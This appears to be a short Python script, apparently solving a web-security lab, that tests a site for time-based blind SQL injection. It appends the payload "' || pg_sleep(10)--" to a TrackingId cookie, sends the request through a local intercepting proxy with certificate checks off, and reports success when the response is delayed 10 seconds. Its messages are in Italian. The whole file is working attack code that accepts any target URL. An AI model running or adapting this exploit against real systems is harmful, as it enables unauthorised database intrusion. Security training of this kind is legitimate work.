import requests
import sys
import urllib3
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}


def exploit_sqli_delay_time(url):
    sql_payload = "' || pg_sleep(10)--"
    cookies = {'TrackingId' : 'B5KPUdK7dlXDU5Sa' + sql_payload, 'session' : 'NbRMsS8MVVRm6fZUEwAtAGsIbINRc035'}
    r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
    response_time = r.elapsed
    return response_time.total_seconds()


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Utilizzo: %s <url>" % sys.argv[0])
        print("[-] Esempio: %s www.example.com" % sys.argv[0])
        sys.exit()


    if exploit_sqli_delay_time(url) >= 10.0:
        print("[+] Injection ha avuto successo")
   